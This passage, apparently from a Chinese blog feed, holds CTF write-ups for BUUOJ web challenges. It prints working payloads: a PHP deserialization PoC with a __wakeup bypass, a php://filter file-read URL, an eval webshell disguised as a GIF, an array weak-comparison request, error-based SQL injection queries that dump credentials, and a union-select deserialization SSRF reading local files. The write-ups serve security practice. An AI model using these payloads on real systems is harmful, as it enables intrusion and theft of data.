<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>编写<code>POC</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="comment"># error_reporting(0);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Name(<span class="string">"admin"</span>, <span class="number">100</span>);</span><br><span class="line"><span class="comment">#进行url编码，防止%00对应的不可打印字符在复制时丢失</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>备注：最后生成的<code>POC</code>需要绕过<code>wakeup</code>(当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过<code>__wakeup()</code>的执行)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span><br><span class="line">O%3A4%3A%22Name%22%3A4%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019PHP/4.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>源码泄露</tag>
        <tag>php反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战2019SecretFile</title>
    <url>/2021/01/21/blog_formal/security/CTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/</url>
    <content><![CDATA[<h1 id="极客大挑战2019SecretFile"><a href="#极客大挑战2019SecretFile" class="headerlink" title="极客大挑战2019SecretFile"></a>极客大挑战2019SecretFile</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>php伪协议</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页，查看网页源码</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/1.png" alt></p>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/2.png" alt></p>
<ul>
<li>登录<code>Archive_room.php</code></li>
<li>抓包，看返回值</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/3.png" alt></p>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/4.png" alt></p>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/5.png" alt></p>
<ul>
<li>登录<code>secr3t.php</code>,看到源码</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/6.png" alt></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>这里使用 <code>php</code>伪协议</li>
</ul>
<p>php://filter是一种元封装器，用于数据流打开时筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用。类似readfile()、file()、file_get_contents(),在数据流读取之前没有机会使用其他过滤器。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>resource=&lt;要过滤的数据流&gt;</td>
<td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
</tr>
<tr>
<td><em>read=&lt;读链的筛选列表&gt;</em></td>
<td>该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔</td>
</tr>
<tr>
<td><em>write=&lt;写链的筛选列表&gt;</em></td>
<td>该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔</td>
</tr>
<tr>
<td>*&lt;；两个链的筛选列表&gt;*</td>
<td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/[read/write]=string.[rot13/strip_tags/…..]/resource=xxx</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-[encode/decode]/resource=xxx</span></span><br></pre></td></tr></table></figure>

<p>备注：<code>include</code>如果包含非代码，那么会直接输出到页面字符串，如果代码则不会输出，我们利用<code>base64</code>编码是正常<code>php</code>代码变为字符串输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p><code>payload</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://xxxxx.node3.buuoj.cn/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/7.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZTNjN2NmYjgtNDA5OC00MTBmLWE4NTUtODRjZDk4YWE1MzY3fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</span><br><span class="line"></span><br><span class="line">base64 decode</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">flag&#123;e3c7cfb8-4098-410f-a855-84cd98aa5367&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/8.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>php伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战2019Upload</title>
    <url>/2021/02/06/blog_formal/security/CTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Upload/</url>
    <content><![CDATA[<h1 id="极客大挑战2019Upload"><a href="#极客大挑战2019Upload" class="headerlink" title="极客大挑战2019Upload"></a>极客大挑战2019Upload</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>文件上传</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Upload/1.png" alt></p>
<ul>
<li>绕过姿势</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GIF89a </span><br><span class="line">&lt;script language='php'&gt;@eval($_REQUEST[4396]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Upload/2.png" alt></p>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Upload/3.png" alt></p>
<ul>
<li>拿 <code>flag</code></li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Upload/4.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战2020Roamphp1_Welcome</title>
    <url>/2021/03/01/blog_formal/security/CTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020Roamphp1_Welcome/</url>
    <content><![CDATA[<h1 id="极客大挑战2020Roamphp1-Welcome"><a href="#极客大挑战2020Roamphp1-Welcome" class="headerlink" title="极客大挑战2020Roamphp1_Welcome"></a>极客大挑战2020Roamphp1_Welcome</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>sha</code>弱类型比较绕过</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020Roamphp1_Welcome/1.png" alt></p>
<ul>
<li>更换请求方式为<code>POST</code></li>
</ul>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020Roamphp1_Welcome/2.png" alt></p>
<ul>
<li>弱类型比较绕过</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 3d7effb3-3d9b-40d5-a8f7-aeb8f3a2e9e5.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 19</span><br><span class="line"></span><br><span class="line">roam1[]=1&amp;roam2[]=2</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020Roamphp1_Welcome/3.png" alt></p>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020Roamphp1_Welcome/4.png" alt></p>
<p><img data-src="./%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020Roamphp1_Welcome/5.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>sha弱类型比较绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯2018Fakebook</title>
    <url>/2021/02/04/blog_formal/security/CTF/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/</url>
    <content><![CDATA[<h1 id="网鼎杯2018Fakebook"><a href="#网鼎杯2018Fakebook" class="headerlink" title="网鼎杯2018Fakebook"></a>网鼎杯2018Fakebook</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>sql</code>注入</li>
<li><code>php</code>反序列化</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页&amp;&amp;<code>join</code>后</li>
</ul>
<p><img data-src="./%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/1.png" alt></p>
<p><img data-src="./%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/2.png" alt></p>
<ul>
<li><code>robots.txt</code>发现源码泄露</li>
</ul>
<p><img data-src="./%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/3.png" alt></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>继续寻找，发现<code>sql</code>注入</li>
</ul>
<p><img data-src="./%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/4.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://4d56c02e-5519-474c-9ed6-8c2f1be2f5eb.node3.buuoj.cn/view.php?no=1 and 1=updatexml(1,concat('~',(select database())),1)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">fakebook</span><br><span class="line"></span><br><span class="line">http://4d56c02e-5519-474c-9ed6-8c2f1be2f5eb.node3.buuoj.cn/view.php?no=1 and 1=updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema='fakebook')),1)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">users</span><br><span class="line"></span><br><span class="line">http://4d56c02e-5519-474c-9ed6-8c2f1be2f5eb.node3.buuoj.cn/view.php?no=1 and 1=updatexml(1,concat('~',(select column_name from information_schema.columns where table_name='users' limit 0,1)),1)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">no</span><br><span class="line">username</span><br><span class="line">passwd</span><br><span class="line">data</span><br><span class="line">USER</span><br><span class="line">CURRENT_CONNECTIONS</span><br><span class="line">TOTAL_CONNECTIONS</span><br><span class="line"></span><br><span class="line">http://4d56c02e-5519-474c-9ed6-8c2f1be2f5eb.node3.buuoj.cn/view.php?no=1 and 1=updatexml(1,concat('~',(select group_concat(username) from fakebook.users)),1)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">admin,admin1</span><br><span class="line"></span><br><span class="line">http://4d56c02e-5519-474c-9ed6-8c2f1be2f5eb.node3.buuoj.cn/view.php?no=1 and 1=updatexml(1,concat('~',(select group_concat(passwd) from fakebook.users)),1)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">c7ad44cbad762a5da0a452f9e854fdc</span><br><span class="line"></span><br><span class="line">http://4d56c02e-5519-474c-9ed6-8c2f1be2f5eb.node3.buuoj.cn/view.php?no=1 and 1=updatexml(1,concat('~',(select data from fakebook.users limit 0,1)),1)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">O:8:"UserInfo":3:&#123;s:4:"name";s:')</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 反序列化</span></span><br></pre></td></tr></table></figure>

<ul>
<li>继续分析</li>
</ul>
<p><img data-src="./%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/5.png" alt></p>
<p><code>view.php</code>存在反序列化操作</p>
<p>猜测是先获取数据库内容，然后反序列化操作，还原<code>class UserInfo</code></p>
<ul>
<li>需要<code>/**/</code>绕过空格</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://4d56c02e-5519-474c-9ed6-8c2f1be2f5eb.node3.buuoj.cn/view.php?no=1 and 1=2/**/union/**/select/**/1,2,3,4</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/6.png" alt></p>
<p>而</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://4d56c02e-5519-474c-9ed6-8c2f1be2f5eb.node3.buuoj.cn/view.php?no=1 and 1=2 union select 1,2,3,4</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/7.png" alt></p>
<ul>
<li>构造反序列话串</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> UserInfo(<span class="string">"admin"</span>, <span class="number">12</span>, <span class="string">"file:///var/www/html/flag.php"</span>);</span><br><span class="line">var_dump(serialize($a));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// O:8:"UserInfo":3:&#123;s:4:"name";s:5:"admin";s:3:"age";i:12;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>拿<code>flag</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://4d56c02e-5519-474c-9ed6-8c2f1be2f5eb.node3.buuoj.cn/view.php?no=1 and 1=2/**/union/**/select/**/1,2,3,'O:8:"UserInfo":3:&#123;s:4:"name";s:5:"admin";s:3:"age";i:12;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;'</span><br></pre></td></tr></table></figure>

<p><img data-src="./%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/8.png" alt></p>
<p><img data-src="./%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/9.png" alt></p>
<p><img data-src="./%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/10.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>php反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯2020半决赛AliceWebsite</title>
    <url>/2021/01/25/blog_formal/security/CTF/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8D%8A%E5%86%B3%E8%B5%9BAliceWebsite/</url>
    <content><![CDATA[<h1 id="网鼎杯2020半决赛AliceWebsite"><a href="#网鼎杯2020半决赛AliceWebsite" class="headerlink" title="网鼎杯2020半决赛AliceWebsite"></a>网鼎杯2020半决赛AliceWebsite</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>文件包含</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8D%8A%E5%86%B3%E8%B5%9BAliceWebsite/1.png" alt></p>
<ul>
<li>查看源码</li>
</ul>
